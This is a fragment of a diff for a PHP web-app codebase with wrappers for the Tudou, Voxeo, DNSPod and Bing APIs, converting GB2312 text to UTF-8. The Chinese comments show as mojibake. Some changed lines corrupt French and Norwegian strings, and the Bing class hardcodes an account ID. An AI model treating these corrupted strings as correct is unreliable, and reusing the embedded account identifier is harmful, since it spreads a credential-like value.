                 		//$objHdd = $objList->item($i);
-                        	$mediaulist[$i]['itemCode'] = GetGB2312String($jsonstr['multiPageResult']['results'][$i]['itemCode']);                		
-                        	$mediaulist[$i]['mediatags'] = GetGB2312String($jsonstr['multiPageResult']['results'][$i]['tags']);
-                        	$mediaulist[$i]['mediatitle'] = GetGB2312String($jsonstr['multiPageResult']['results'][$i]['title']);
-                        	$mediaulist[$i]['mediadescription'] = GetGB2312String($jsonstr['multiPageResult']['results'][$i]['description']);
-                        	$mediaulist[$i]['mediapicurl'] = GetGB2312String($jsonstr['multiPageResult']['results'][$i]['picUrl']);
-                        	$mediaulist[$i]['mediatime'] = GetGB2312String($jsonstr['multiPageResult']['results'][$i]['totalTime']);
-                        	$mediaulist[$i]['mediacreatetime'] = GetGB2312String($jsonstr['multiPageResult']['results'][$i]['pubDate']);
-                        	$mediaulist[$i]['mediaownerid'] = GetGB2312String($jsonstr['multiPageResult']['results'][$i]['ownerId']);
-                        	$mediaulist[$i]['mediaownername'] = GetGB2312String($jsonstr['multiPageResult']['results'][$i]['ownerName']);
-                        	$mediaulist[$i]['mediaownernickname'] = GetGB2312String($jsonstr['multiPageResult']['results'][$i]['ownerNickname']);
-                        	$mediaulist[$i]['mediaclass'] = GetGB2312String($jsonstr['multiPageResult']['results'][$i]['channelId']);
-                        	$mediaulist[$i]['mediaplayerurl'] = GetGB2312String($jsonstr['multiPageResult']['results'][$i]['outerPlayerUrl']);
-                        	$mediaulist[$i]['mediaitemurl'] = GetGB2312String($jsonstr['multiPageResult']['results'][$i]['itemUrl']);
-                        	$mediaulist[$i]['mediaitemid'] = GetGB2312String($jsonstr['multiPageResult']['results'][$i]['itemId']);
-                        	$mediaulist[$i]['mediaitemcode'] = GetGB2312String($jsonstr['multiPageResult']['results'][$i]['itemCode']);
-                        	$mediaulist[$i]['mediatype'] = GetGB2312String($jsonstr['multiPageResult']['results'][$i]['mediaType']);
-                        	$mediaulist[$i]['mediasecret'] = GetGB2312String($jsonstr['multiPageResult']['results'][$i]['secret']);
+                        	$mediaulist[$i]['itemCode'] = ($jsonstr['multiPageResult']['results'][$i]['itemCode']);                		
+                        	$mediaulist[$i]['mediatags'] = ($jsonstr['multiPageResult']['results'][$i]['tags']);
+                        	$mediaulist[$i]['mediatitle'] = ($jsonstr['multiPageResult']['results'][$i]['title']);
+                        	$mediaulist[$i]['mediadescription'] = ($jsonstr['multiPageResult']['results'][$i]['description']);
+                        	$mediaulist[$i]['mediapicurl'] = ($jsonstr['multiPageResult']['results'][$i]['picUrl']);
+                        	$mediaulist[$i]['mediatime'] = ($jsonstr['multiPageResult']['results'][$i]['totalTime']);
+                        	$mediaulist[$i]['mediacreatetime'] = ($jsonstr['multiPageResult']['results'][$i]['pubDate']);
+                        	$mediaulist[$i]['mediaownerid'] = ($jsonstr['multiPageResult']['results'][$i]['ownerId']);
+                        	$mediaulist[$i]['mediaownername'] = ($jsonstr['multiPageResult']['results'][$i]['ownerName']);
+                        	$mediaulist[$i]['mediaownernickname'] = ($jsonstr['multiPageResult']['results'][$i]['ownerNickname']);
+                        	$mediaulist[$i]['mediaclass'] = ($jsonstr['multiPageResult']['results'][$i]['channelId']);
+                        	$mediaulist[$i]['mediaplayerurl'] = ($jsonstr['multiPageResult']['results'][$i]['outerPlayerUrl']);
+                        	$mediaulist[$i]['mediaitemurl'] = ($jsonstr['multiPageResult']['results'][$i]['itemUrl']);
+                        	$mediaulist[$i]['mediaitemid'] = ($jsonstr['multiPageResult']['results'][$i]['itemId']);
+                        	$mediaulist[$i]['mediaitemcode'] = ($jsonstr['multiPageResult']['results'][$i]['itemCode']);
+                        	$mediaulist[$i]['mediatype'] = ($jsonstr['multiPageResult']['results'][$i]['mediaType']);
+                        	$mediaulist[$i]['mediasecret'] = ($jsonstr['multiPageResult']['results'][$i]['secret']);
 	        	}
 		}
                	//print_r($mediaulist);
@@ -13238,7 +14874,7 @@ function tudoumediaulist($uname,$page,$pagesize){
 
 function tudoumediaiteminfo($itemCodes){
         	if (0){
-        		$jsonstr = '{"multiResult":{"results":[{"description":"test","tags":"test","alias":"","definition":0,"itemId":1000232,"ownerId":262809,"playTimes":233970,"title":"test","totalTime":20100,"pubDate":"2006-04-27","channelId":1,"bigPicUrl":"http://i1.tdimg.com/001/000/232/w.jpg","itemCode":"yg8CVootoAc","mediaType":"ÊÓÆµ","downEnable":true,"picUrl":"http://i1.tdimg.com/001/000/232/p.jpg","itemUrl":"http://www.tudou.com/programs/view/yg8CVootoAc/","commentCount":9,"ownerName":"yumihhh","ownerNickname":"yumihhh","outerPlayerUrl":"http://www.tudou.com/v/yg8CVootoAc/v.swf","picChoiceUrl":["http://image2.tudou.com/data/imgs/i/001/000/232/m15.jpg","http://image2.tudou.com/data/imgs/i/001/000/232/m30.jpg"],"secret":false,"addPlaylistTime":""}]}}';
+        		$jsonstr = '{"multiResult":{"results":[{"description":"test","tags":"test","alias":"","definition":0,"itemId":1000232,"ownerId":262809,"playTimes":233970,"title":"test","totalTime":20100,"pubDate":"2006-04-27","channelId":1,"bigPicUrl":"http://i1.tdimg.com/001/000/232/w.jpg","itemCode":"yg8CVootoAc","mediaType":"è§†é¢‘","downEnable":true,"picUrl":"http://i1.tdimg.com/001/000/232/p.jpg","itemUrl":"http://www.tudou.com/programs/view/yg8CVootoAc/","commentCount":9,"ownerName":"yumihhh","ownerNickname":"yumihhh","outerPlayerUrl":"http://www.tudou.com/v/yg8CVootoAc/v.swf","picChoiceUrl":["http://image2.tudou.com/data/imgs/i/001/000/232/m15.jpg","http://image2.tudou.com/data/imgs/i/001/000/232/m30.jpg"],"secret":false,"addPlaylistTime":""}]}}';
 	               	$jsonstr = json_decode($jsonstr,true);
 	               	//print_r($jsonstr);
         	}       
@@ -13272,22 +14908,22 @@ function tudoumediaiteminfo($itemCodes){
 
         		//for($i = 0;$i < $strpagesize;$i++){
                 		//$objHdd = $objList->item($i);
-                        	$mediainfo['mediatags'] = iconv('utf-8','gb2312','aaaaaaaaaaaa');
-                        	$mediainfo['mediatitle'] = iconv('utf-8','gb2312','bbbbbbbbbbbbbbb');
-                        	$mediainfo['mediadescription'] = iconv('utf-8','gb2312','ccccccccccccccccc');
-                        	$mediainfo['mediapicurl'] = iconv('utf-8','gb2312','hhhhhhhhhhhhhh');
-                        	$mediainfo['mediatime'] = iconv('utf-8','gb2312','ggggggggggggggggg');
-                        	$mediainfo['mediacreatetime'] = iconv('utf-8','gb2312','jjjjjjjjjjjjjj');
-                        	$mediainfo['mediaownerid'] = iconv('utf-8','gb2312','kkkkkkkkkkkkkk');
-                        	$mediainfo['mediaownername'] = iconv('utf-8','gb2312','mmmmmmmmmmmmmmmmm');
-                        	$mediainfo['mediaownernickname'] = iconv('utf-8','gb2312','uuuuuuuuuuuuu');
-                        	$mediainfo['mediaclass'] = iconv('utf-8','gb2312','oooooooooooo');
-                        	$mediainfo['mediaplayerurl'] = iconv('utf-8','gb2312','ppppppppppp');
-                        	$mediainfo['mediaitemurl'] = iconv('utf-8','gb2312','yyyyyyyyyyy');
-                        	$mediainfo['mediaitemid'] = iconv('utf-8','gb2312','hhhhhhhhhhhhhhhhh');
-                        	$mediainfo['mediaitemcode'] = iconv('utf-8','gb2312','hhhhhhhhhhhhhhhhhhh');
-                        	$mediainfo['mediatype'] = iconv('utf-8','gb2312','rrrrrrrrrrrrrrr');
-                        	$mediainfo['mediasecret'] = iconv('utf-8','gb2312','rrrrrrrrrrrrrrr');
+                        	$mediainfo['mediatags'] = ('aaaaaaaaaaaa');
+                        	$mediainfo['mediatitle'] = ('bbbbbbbbbbbbbbb');
+                        	$mediainfo['mediadescription'] = ('ccccccccccccccccc');
+                        	$mediainfo['mediapicurl'] = ('hhhhhhhhhhhhhh');
+                        	$mediainfo['mediatime'] = ('ggggggggggggggggg');
+                        	$mediainfo['mediacreatetime'] = ('jjjjjjjjjjjjjj');
+                        	$mediainfo['mediaownerid'] = ('kkkkkkkkkkkkkk');
+                        	$mediainfo['mediaownername'] = ('mmmmmmmmmmmmmmmmm');
+                        	$mediainfo['mediaownernickname'] = ('uuuuuuuuuuuuu');
+                        	$mediainfo['mediaclass'] = ('oooooooooooo');
+                        	$mediainfo['mediaplayerurl'] = ('ppppppppppp');
+                        	$mediainfo['mediaitemurl'] = ('yyyyyyyyyyy');
+                        	$mediainfo['mediaitemid'] = ('hhhhhhhhhhhhhhhhh');
+                        	$mediainfo['mediaitemcode'] = ('hhhhhhhhhhhhhhhhhhh');
+                        	$mediainfo['mediatype'] = ('rrrrrrrrrrrrrrr');
+                        	$mediainfo['mediasecret'] = ('rrrrrrrrrrrrrrr');
 	        	//}
 	        	//print_r($mediaulist);
         	}       
@@ -13308,22 +14944,22 @@ function tudoumediaiteminfo($itemCodes){
 
         		//for($i = 0;$i < $strpagesize;$i++){
                 		//$objHdd = $objList->item($i);
-                        	$mediainfo['mediatags'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['tags']);
-                        	$mediainfo['mediatitle'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['title']);
-                        	$mediainfo['mediadescription'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['description']);
-                        	$mediainfo['mediapicurl'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['picUrl']);
-                        	$mediainfo['mediatime'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['totalTime']);
-                        	$mediainfo['mediacreatetime'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['pubDate']);
-                        	$mediainfo['mediaownerid'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['ownerId']);
-                        	$mediainfo['mediaownername'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['ownerName']);
-                        	$mediainfo['mediaownernickname'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['ownerNickname']);
-                        	$mediainfo['mediaclass'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['channelId']);
-                        	$mediainfo['mediaplayerurl'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['outerPlayerUrl']);
-                        	$mediainfo['mediaitemurl'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['itemUrl']);
-                        	$mediainfo['mediaitemid'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['itemId']);
-                        	$mediainfo['mediaitemcode'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['itemCode']);
-                        	$mediainfo['mediatype'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['mediaType']);
-                        	$mediainfo['mediasecret'] = iconv('utf-8','gb2312',$jsonstr['multiResult']['results'][0]['secret']);
+                        	$mediainfo['mediatags'] = ($jsonstr['multiResult']['results'][0]['tags']);
+                        	$mediainfo['mediatitle'] = ($jsonstr['multiResult']['results'][0]['title']);
+                        	$mediainfo['mediadescription'] = ($jsonstr['multiResult']['results'][0]['description']);
+                        	$mediainfo['mediapicurl'] = ($jsonstr['multiResult']['results'][0]['picUrl']);
+                        	$mediainfo['mediatime'] = ($jsonstr['multiResult']['results'][0]['totalTime']);
+                        	$mediainfo['mediacreatetime'] = ($jsonstr['multiResult']['results'][0]['pubDate']);
+                        	$mediainfo['mediaownerid'] = ($jsonstr['multiResult']['results'][0]['ownerId']);
+                        	$mediainfo['mediaownername'] = ($jsonstr['multiResult']['results'][0]['ownerName']);
+                        	$mediainfo['mediaownernickname'] = ($jsonstr['multiResult']['results'][0]['ownerNickname']);
+                        	$mediainfo['mediaclass'] = ($jsonstr['multiResult']['results'][0]['channelId']);
+                        	$mediainfo['mediaplayerurl'] = ($jsonstr['multiResult']['results'][0]['outerPlayerUrl']);
+                        	$mediainfo['mediaitemurl'] = ($jsonstr['multiResult']['results'][0]['itemUrl']);
+                        	$mediainfo['mediaitemid'] = ($jsonstr['multiResult']['results'][0]['itemId']);
+                        	$mediainfo['mediaitemcode'] = ($jsonstr['multiResult']['results'][0]['itemCode']);
+                        	$mediainfo['mediatype'] = ($jsonstr['multiResult']['results'][0]['mediaType']);
+                        	$mediainfo['mediasecret'] = ($jsonstr['multiResult']['results'][0]['secret']);
 	        	//}
 					}
           //print_r($mediainfo);
@@ -13403,15 +15039,15 @@ function tudoumediaupload($uname,$pwd,$content,$tags,$title,$channelId,$file){
 <?php 
 
 // ----------------------------------------------------------------
-//  Evolution.voxeo.com - X3193ÓïÒôºÍÓ¢ÎÄ¶ÌĞÅÏµÍ³·Ç±ê×¼¶ÀÁ¢Àà v1.1
-//  ¹©ÄÜ£ºÊµÏÖÓ¢ÎÄÓïÒôºÍÓ¢ÎÄ¶ÌĞÅÊÕ·¢
-//  ÊµÏÖ£ºX3193API
-//  ¹©Ó¦£ºvoxeo.com
-//  ÊÕ²Ø£º¡î¡î¡î¡î¡î
-//  Ê±¼ä£º2011-7-27 11:34AM
-//  ĞĞÊı£º45ĞĞ
+//  Evolution.voxeo.com - X3193è¯­éŸ³å’Œè‹±æ–‡çŸ­ä¿¡ç³»ç»Ÿéæ ‡å‡†ç‹¬ç«‹ç±» v1.1
+//  ä¾›èƒ½ï¼šå®ç°è‹±æ–‡è¯­éŸ³å’Œè‹±æ–‡çŸ­ä¿¡æ”¶å‘
+//  å®ç°ï¼šX3193API
+//  ä¾›åº”ï¼švoxeo.com
+//  æ”¶è—ï¼šâ˜†â˜†â˜†â˜†â˜†
+//  æ—¶é—´ï¼š2011-7-27 11:34AM
+//  è¡Œæ•°ï¼š45è¡Œ
 // ----------------------------------------------------------------
-//  ¸üĞÂÈÕÖ¾£º
+//  æ›´æ–°æ—¥å¿—ï¼š
 // ----------------------------------------------------------------
 
 class voxeo_class{
@@ -13483,7 +15119,7 @@ function Phonelimiter() {
 function voxeoverifycallid($callid){
  	$allowphone = $this->Phonelimiter();
 	for($i=0;$i<count(split("[|]",$allowphone));$i++){
-		// voxeo CALLME ²å¼şÌØÓĞ
+		// voxeo CALLME æ’ä»¶ç‰¹æœ‰
   	if(preg_match("/\w{8}[-]\w{4}[-]\w{4}[-]\w{4}[-]\w{12}/", strtolower(trim(arrmember(split("[|]",$allowphone),$i))))){
    		return "1";
   	}
@@ -13614,7 +15250,7 @@ function dnspoddomainlist($dnspoduname,$dnspodpwd,$type,$page,$pagesize){
         $objXml = new DOMDocument();  
         $objXml->preserveWhiteSpace = true;
         $objXml->async = false; 
-        // ¼ÓXml ÎÄ¼ş    
+        // åŠ Xml æ–‡ä»¶    
         $objXml->loadXML($xmlstr);
         //echo $xmlstr;
         //return;
@@ -13642,12 +15278,12 @@ function dnspoddomainlist($dnspoduname,$dnspodpwd,$type,$page,$pagesize){
         //echo $strpagesize;
         for($i = 0;$i <= $strpagesize-1;$i++){
                 $objHdd = $objList->item($i);
-                        $domainlist[$i]['domainid'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('id')->item(0)->nodeValue);
-                        $domainlist[$i]['domain'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('name')->item(0)->nodeValue);
-                        $domainlist[$i]['domaingrade'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('grade')->item(0)->nodeValue);
-                        $domainlist[$i]['domainstatus'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('status')->item(0)->nodeValue);
-                        $domainlist[$i]['domainrecords'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('records')->item(0)->nodeValue);
-                        $domainlist[$i]['domainshared'] = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('shared_from')->item(0)->nodeValue);
+                        $domainlist[$i]['domainid'] = ($objHdd->getElementsByTagName('id')->item(0)->nodeValue);
+                        $domainlist[$i]['domain'] = ($objHdd->getElementsByTagName('name')->item(0)->nodeValue);
+                        $domainlist[$i]['domaingrade'] = ($objHdd->getElementsByTagName('grade')->item(0)->nodeValue);
+                        $domainlist[$i]['domainstatus'] = ($objHdd->getElementsByTagName('status')->item(0)->nodeValue);
+                        $domainlist[$i]['domainrecords'] = ($objHdd->getElementsByTagName('records')->item(0)->nodeValue);
+                        $domainlist[$i]['domainshared'] = ($objHdd->getElementsByTagName('shared_from')->item(0)->nodeValue);
         }
         //print_r($domainlist);
         return $domainlist;
@@ -13803,7 +15439,7 @@ function dnspoddomainremove($dnspoduname,$dnspodpwd,$domain_id,$type,$postfield,
                 $objXml = new DOMDocument();  
                 $objXml->preserveWhiteSpace = true;
                 $objXml->async = false; 
-                // ¼ÓXml ÎÄ¼ş    
+                // åŠ Xml æ–‡ä»¶    
                 $objXml->loadXML($xmlstr);      
         
                 $objList = $objXml->getElementsByTagName("item");                       
@@ -13894,7 +15530,7 @@ inttotalpage = <?php  echo $totalpage; ?>
 <?php echo "\r\n";?>
 pagecount=int(trim(inputbox("<?php  echo $note;?>","<?php  echo $title; ?>")))
 if int(pagecount) > int(inttotalpage) then
-        msgbox("<?php echo formatchar("ÊäÈëÒ³Âë´óÓÚÊµ¼ÊÒ³Êı£¡")?>")
+        msgbox("<?php echo ("è¾“å…¥é¡µç å¤§äºå®é™…é¡µæ•°ï¼")?>")
 else
         window.location.href="<?php  echo $url;?>"&pagecount
 end if
@@ -13909,7 +15545,7 @@ function CallPageChange(){
                 <input name="Query" value="<?php  echo $query; ?>" style="height:20px;width:50px;font-size:11px;" <?php  $style->input("#FCFC9D",""); ?>>
 								<input type="submit" class="button" name="gotopage" value=" Go ">                
                 <NOSCRIPT>
-                <a href="#" style="color:#444444" onclick="vbscript:gotopage()"><?php echo formatchar('×ªµ½')?></a>
+                <a href="#" style="color:#444444" onclick="vbscript:gotopage()"><?php echo ('è½¬åˆ°')?></a>
                 </NOSCRIPT>
 <?php 
 }
@@ -14064,14 +15700,14 @@ function checkForm(this_form)
 {
         if (this_form.Title.value == '')
     {
-                alert("±êÌâ²»ÄÜÎª¿Õ, ÇëÖØĞÂÊäÈë£¡");
+                alert("æ ‡é¢˜ä¸èƒ½ä¸ºç©º, è¯·é‡æ–°è¾“å…¥ï¼");
                 this_form.Title.focus();                
                 return false;
     }
 
         if (this_form.FromURL.value == '')
     {
-                alert("ÍøÖ·²»ÄÜÎª¿Õ, ÇëÖØĞÂÊäÈë£¡");
+                alert("ç½‘å€ä¸èƒ½ä¸ºç©º, è¯·é‡æ–°è¾“å…¥ï¼");
                 this_form.FromURL.focus();              
                 return false;
     }
@@ -14107,7 +15743,7 @@ function checkForm(this_form)
                 }
                 if (length > 100)
                 {
-                        alert ("±êÌâ50¸öºº×ÖÖ®ÄÚ£¬ÇëÖØĞÂÊäÈë");
+                        alert ("æ ‡é¢˜50ä¸ªæ±‰å­—ä¹‹å†…ï¼Œè¯·é‡æ–°è¾“å…¥");
                         this_form.Title.focus();                        
                         return false;
                 }
@@ -14125,7 +15761,7 @@ function checkForm(this_form)
                 }
                 if (length > 10000)
                 {
-                        alert ("¼ò½é200¸öºº×ÖÖ®ÄÚ£¬ÇëÖØĞÂÊäÈë");
+                        alert ("ç®€ä»‹200ä¸ªæ±‰å­—ä¹‹å†…ï¼Œè¯·é‡æ–°è¾“å…¥");
                         this_form.Intro.focus();                                                
                         return false;
                 }
@@ -14173,7 +15809,7 @@ if(re.test(Href)){
 }
 
 function jscentoload($formname,$unitname,$selectname){
-//¿ÉÑ¡²ÎÊı£ºCento,Title,Url
+//å¯é€‰å‚æ•°ï¼šCento,Title,Url
 if (stripos($selectname,"|") == false){
 ?>
 <script language="JavaScript">
@@ -14187,7 +15823,7 @@ elseif (stripos($selectname,"|") >= 0){
 ?>
 <script language="JavaScript">
         <!--
-        document.<?php echo $formname;?>.<?php echo $unitname;?>.value="±êÌâ£º"+<?php echo arrmenber(split("|",$selectname),(0))?>+"£»Á¬½Ó£º"+<?php  echo arrmember(split("[|]",$selectname),(1))?>+"£»ÕªÒª£º"+<?php echo arrmember(split("[|]",$selectname),(2))?>;
+        document.<?php echo $formname;?>.<?php echo $unitname;?>.value="æ ‡é¢˜ï¼š"+<?php echo arrmenber(split("|",$selectname),(0))?>+"ï¼›è¿æ¥ï¼š"+<?php  echo arrmember(split("[|]",$selectname),(1))?>+"ï¼›æ‘˜è¦ï¼š"+<?php echo arrmember(split("[|]",$selectname),(2))?>;
         //-->
 </script>
 <?php 
@@ -20261,7 +21897,7 @@ class zipfile
 ?>
 
 <?php 
-////////////////////////ZIPÀà///////////////////////////////
+////////////////////////ZIPç±»///////////////////////////////
 class zip 
 {
 
@@ -20559,7 +22195,7 @@ class zip
    $binary_data = pack('VV', $header['crc'], $header['size']);
    fwrite($fp, $binary_data,8); fclose($fp);
 
-   $gzp = @gzopen($to.$header['filename'].'.gz','rb') or die("Cette archive est compressée");
+   $gzp = @gzopen($to.$header['filename'].'.gz','rb') or die("Cette archive est compressé–‘");
     if(!$gzp) return(-2);
    $fp = @fopen($to.$header['filename'],'wb');
    if(!$fp) return(-1);
@@ -20581,7 +22217,7 @@ class zip
   }}
   return true;
  }
-} //ZIPÑ¹ËõÀàend
+} //ZIPå‹ç¼©ç±»end
 ?>
 
 <?php 
@@ -20658,7 +22294,7 @@ Lithuanian (1063)
 Macedonian (1071)
 Malay Malaysia (1086)
 Maltese (1082)
-Norwegian  Bokmål (1044)
+Norwegian  BokméŒ¶ (1044)
 Polish (1045)
 Portuguese Standard (2070)
 Portuguese Brazil (1046)
@@ -22757,7 +24393,7 @@ class XMPPHP_XMPP extends XMPPHP_XMLStream {
 }
 
 class mail_class{
-// ¶ÔÓÊ¼şµØÖ·½øĞĞÖĞÎÄµÄUTF-8±àÂë×ª»¯
+// å¯¹é‚®ä»¶åœ°å€è¿›è¡Œä¸­æ–‡çš„UTF-8ç¼–ç è½¬åŒ–
 function format_mail_address($address,$codebase){
   if(preg_match("|<([^<]+)>|", $address, $matches)){
     $name = mb_substr($address, 0, strpos($address, '<'));
@@ -22773,7 +24409,7 @@ function format_mail_address($address,$codebase){
   return $address;
 }
 
-// ·¢ËÍhtml¸ñÊ½µÄÓÊ¼ş
+// å‘é€htmlæ ¼å¼çš„é‚®ä»¶
 function html_mail($from, $to, $subject, $body, $codebase){
   if(preg_match("|<([^<]+)>|", $from, $matches)){
     $from_name = mb_substr($from, 0, strpos($from, '<'));
@@ -22812,15 +24448,15 @@ function html_mail($from, $to, $subject, $body, $codebase){
   mail($to, $subject, $body, join("\r\n", $headers), "-f $from_mail");
 }
 
-//º¯ÊıÊ¹ÓÃ¿ÉÒÔ²ÎÕÕÏÂÃæµÄÀı×Ó£º
+//å‡½æ•°ä½¿ç”¨å¯ä»¥å‚ç…§ä¸‹é¢çš„ä¾‹å­ï¼š
 //html_mail(
-//    "ÀÏ¹È×ÔÑÔ×ÔÓï <admin@yorkgu.me>",
+//    "è€è°·è‡ªè¨€è‡ªè¯­ <admin@yorkgu.me>",
 //    array(
-//        "ÓÃ»§A <user1@gmail.com>",
-//        "ÓÃ»§B <user2@163.com>"),
-//    "ÕâÊÇÒ»·â²âÊÔÓÊ¼ş",
+//        "ç”¨æˆ·A <user1@gmail.com>",
+//        "ç”¨æˆ·B <user2@163.com>"),
+//    "è¿™æ˜¯ä¸€å°æµ‹è¯•é‚®ä»¶",
 //    "<html><body><h1 style='color:red'>
-//      ¸ĞĞ»µ³£¬¸ĞĞ»Õş¸®£¬¸ĞĞ»´óÖĞ»ª¾ÖÓòÍø£¬¸øÎÒÕâ¸ö·¢ËÍÓÊ¼şµÄ»ú»á¡£
+//      æ„Ÿè°¢å…šï¼Œæ„Ÿè°¢æ”¿åºœï¼Œæ„Ÿè°¢å¤§ä¸­åå±€åŸŸç½‘ï¼Œç»™æˆ‘è¿™ä¸ªå‘é€é‚®ä»¶çš„æœºä¼šã€‚
 //    </h1></body></html>"
 //);
 }
@@ -22830,15 +24466,15 @@ function html_mail($from, $to, $subject, $body, $codebase){
 <?php 
 
 // ----------------------------------------------------------------
-//  Code.google.com - X3193-Google¶àÓÃ»§¶à½Ó¿ÚÏµÍ³·Ç±ê×¼¶ÀÁ¢Àà v1.1
-//  ¹©ÄÜ£ºÊµÏÖ¶àÖÖ½Ó¿Úµ÷ÓÃ£¬°üÀ¨µØÍ¼¡¢Ïà²á¡¢ÍøÖ·¡¢ÈÕÀúµÈ¡£
-//  ÊµÏÖ£ºX3193API
-//  ¹©Ó¦£ºgoogle.com
-//  ÊÕ²Ø£º¡î¡î¡î¡î¡î
-//  Ê±¼ä£º2011-7-27 11:45AM
-//  ĞĞÊı£º45ĞĞ
+//  Code.google.com - X3193-Googleå¤šç”¨æˆ·å¤šæ¥å£ç³»ç»Ÿéæ ‡å‡†ç‹¬ç«‹ç±» v1.1
+//  ä¾›èƒ½ï¼šå®ç°å¤šç§æ¥å£è°ƒç”¨ï¼ŒåŒ…æ‹¬åœ°å›¾ã€ç›¸å†Œã€ç½‘å€ã€æ—¥å†ç­‰ã€‚
+//  å®ç°ï¼šX3193API
+//  ä¾›åº”ï¼šgoogle.com
+//  æ”¶è—ï¼šâ˜†â˜†â˜†â˜†â˜†
+//  æ—¶é—´ï¼š2011-7-27 11:45AM
+//  è¡Œæ•°ï¼š45è¡Œ
 // ----------------------------------------------------------------
-//  ¸üĞÂÈÕÖ¾£º
+//  æ›´æ–°æ—¥å¿—ï¼š
 // ----------------------------------------------------------------
 class bing_class{
 
@@ -22847,7 +24483,7 @@ var $accountid = '4c2d1744-d684-4155-ad91-955fdba57259';
 var $agentid = 'X3193-WAM';
 
 function bingsearchtype(){
-	return "Web,ÍøÒ³|News,ĞÂÎÅ|Image,Í¼Æ¬|Translate,·­Òë";
+	return "Web,ç½‘é¡µ|News,æ–°é—»|Image,å›¾ç‰‡|Translate,ç¿»è¯‘";
 }
 
 function bingsearchmarket(){
@@ -22855,15 +24491,15 @@ function bingsearchmarket(){
 }
 
 function bingsearchlang(){
-	return "Ar,Arabic|zh-CHS,¼òÌåÖĞÎÄ|zh-CHT,·±ówÖĞÎÄ|Nl,Dutch|En,English|Fr,French|De,German|It,Italian|Ja,Japanese|Ko,Korean|Pl,Polish|Pt,Portuguese|Ru,Russian|Es,Spanish";
+	return "Ar,Arabic|zh-CHS,ç®€ä½“ä¸­æ–‡|zh-CHT,ç¹é«”ä¸­æ–‡|Nl,Dutch|En,English|Fr,French|De,German|It,Italian|Ja,Japanese|Ko,Korean|Pl,Polish|Pt,Portuguese|Ru,Russian|Es,Spanish";
 }
 
 function bingsearchimagelist(){
-	return "photo,ËõÂÔ|list,ÁĞ±í";
+	return "photo,ç¼©ç•¥|list,åˆ—è¡¨";
 }
 
 function bingsearchcountrylang(){
-	return "af,Afghanistan|ar,Arabic|bs-Latn,Bosnian (Latin)|bg,Bulgarian|ca,Catalan|zh-CHS,Chinese Simplified|zh-CHT,Chinese Traditional|hr,Croatian|cs,Czech|da,Danish|nl,Dutch|en,English|et,Estonian|fi,Finnish|fr,French|de,German|el,Greek|ht,Haitian Creole|he,Hebrew|hi,Hindi|mww,Hmong Daw|hu,Hungarian|id,Indonesian|it,Italian|ja,Japanese|sw,Kiswahili|tlh,Klingon|tlh-Qaak,Klingon (pIqaD)|ko,Korean|lv,Latvian|lt,Lithuanian|ms,Malay|mt,Maltese|yua,Yucatec Maya|no,Norwegian|otq,Quer¨¦taro Otomi|fa,Persian|pl,Polish|pt,Portuguese|ro,Romanian|ru,Russian|sr-Cyrl,Serbian (Cyrillic)|sr-Latn,Serbian (Latin)|sk,Slovak|sl,Slovenian|es,Spanish|sv,Swedish|th,Thai|tr,Turkish|uk,Ukrainian|ur,Urdu|vi,Vietnamese|cy,Cyprus";
+	return "af,Afghanistan|ar,Arabic|bs-Latn,Bosnian (Latin)|bg,Bulgarian|ca,Catalan|zh-CHS,Chinese Simplified|zh-CHT,Chinese Traditional|hr,Croatian|cs,Czech|da,Danish|nl,Dutch|en,English|et,Estonian|fi,Finnish|fr,French|de,German|el,Greek|ht,Haitian Creole|he,Hebrew|hi,Hindi|mww,Hmong Daw|hu,Hungarian|id,Indonesian|it,Italian|ja,Japanese|sw,Kiswahili|tlh,Klingon|tlh-Qaak,Klingon (pIqaD)|ko,Korean|lv,Latvian|lt,Lithuanian|ms,Malay|mt,Maltese|yua,Yucatec Maya|no,Norwegian|otq,QuerÃ©taro Otomi|fa,Persian|pl,Polish|pt,Portuguese|ro,Romanian|ru,Russian|sr-Cyrl,Serbian (Cyrillic)|sr-Latn,Serbian (Latin)|sk,Slovak|sl,Slovenian|es,Spanish|sv,Swedish|th,Thai|tr,Turkish|uk,Ukrainian|ur,Urdu|vi,Vietnamese|cy,Cyprus";
 }
 
 function bingsearchcountrycode(){
@@ -22891,7 +24527,7 @@ function bingsearchcountrycode(){
                         $objXml = new DOMDocument();  
                         $objXml->preserveWhiteSpace = true;
                         $objXml->async = false; 
-                        // ¼ÓXml ÎÄ¼ş    
+                        // åŠ Xml æ–‡ä»¶    
                         $objXml->loadXML($jsonarray);
                         $objList = $objXml->getElementsByTagName("entry");
                         $langstr='';
@@ -22914,7 +24550,7 @@ function bingsearchcountrycode(){
                         }
                         return $langstr;
 	//https://msdn.microsoft.com/en-us/library/hh456380.aspx?f=255&MSPPError=-2147217396
